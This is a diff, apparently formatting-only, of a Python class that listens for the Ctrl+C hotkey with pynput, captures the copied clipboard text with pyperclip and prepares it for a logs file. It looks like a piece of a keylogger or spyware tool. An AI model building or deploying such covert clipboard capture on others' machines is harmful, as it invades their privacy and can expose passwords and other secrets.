@@ -6,6 +6,7 @@ from pynput import keyboard
 
 class Clipboard:
     """Monitoring clipboard contents"""
+
     def __init__(self):
         self.path = path
         self.logs = logs_file
@@ -20,7 +21,8 @@ class Clipboard:
 
     def copy_clipboard(self):
         try:
-            self.line = '\n[CTRL + C] -> ' + pyperclip.paste() + ' <- [CTRL + C]\n'
+            self.line = '\n[CTRL + C] -> ' + \
+                pyperclip.paste() + ' <- [CTRL + C]\n'
         except Exception:
             pass
 
@@ -32,5 +34,5 @@ class Clipboard:
 
     def run(self):
         with keyboard.Listener(on_press=self.for_canonical(self.hotkey.press),
-            on_release=self.for_canonical(self.hotkey.release)) as self.listener:
+                               on_release=self.for_canonical(self.hotkey.release)) as self.listener:
             self.listener.join()
